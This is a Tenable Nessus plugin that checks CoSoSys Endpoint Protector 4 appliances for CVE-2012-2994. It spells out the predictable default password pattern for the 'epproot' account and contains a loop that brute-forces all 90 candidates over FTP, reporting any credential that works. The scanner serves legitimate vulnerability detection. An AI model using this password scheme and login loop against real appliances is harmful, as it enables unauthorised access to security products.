#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(62942);
  script_version ("$Revision: 1.6 $");
  script_cvs_date("$Date: 2017/02/03 20:48:28 $");

  script_cve_id("CVE-2012-2994");
  script_bugtraq_id(55570);
  script_osvdb_id(85667);
  script_xref(name:"CERT", value:"591667");
 
  script_name(english:"CoSoSys Endpoint Protector 4 Predictable Password");
  script_summary(english:"Brute Forces all possible combinations of default passwords");
  
  script_set_attribute(attribute:"synopsis", value:"Accounts on the remote host have easily predictable passwords.");
  script_set_attribute(attribute:"description", value:
"The remote CoSoSys Endpoint Protector 4 is affected by a password
disclosure flaw. 

Specifically, the 'epproot' account is set to the default password
'eroot!00($SUM)RO', where ($SUM) is the sum of the 9 digits in the
appliance serial number.");
  script_set_attribute(attribute:"solution", value:"Change the password for this account.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/09/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/11/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:cososys:endpoint_protector");
  script_set_attribute(attribute:"default_account", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2012-2017 Tenable Network Security, Inc.");

  script_dependencies("cososys_endpoint_protector_detect.nasl", "ssh_detect.nasl", "account_check.nasl");
  script_require_keys("www/cososys_endpoint_protector");
  script_require_ports("Services/ftp", 21);
  script_exclude_keys("global_settings/supplied_logins_only");
  exit(0);
}

include("audit.inc");
include("ftp_func.inc");
include("default_account.inc");
include("global_settings.inc");
include("misc_func.inc");

install = get_kb_item_or_exit("www/cososys_endpoint_protector");
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);  

account = "epproot";
i = 0;
success = 0;

port = get_ftp_port(default:21);

while(i < 90 && !success) 
{
  soc = open_sock_tcp(port);
  if (!soc) audit(AUDIT_SVC_FAIL, "FTP", 21);

  password = 'eroot!00' + i++ + 'RO';
  success = ftp_authenticate(socket:soc, user:account, pass:password);
  close(soc);
}
if (success)
{
  if (report_verbosity > 0)
  {
    report = 
      '\n' + 'It was possible to login to the FTP service on the remote host' +
      '\n' + 'with the following credentials :' +
      '\n' +
      '\n   Account  :  ' + account +
      '\n   Password : ' + password +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_HOST_NOT, "affected");
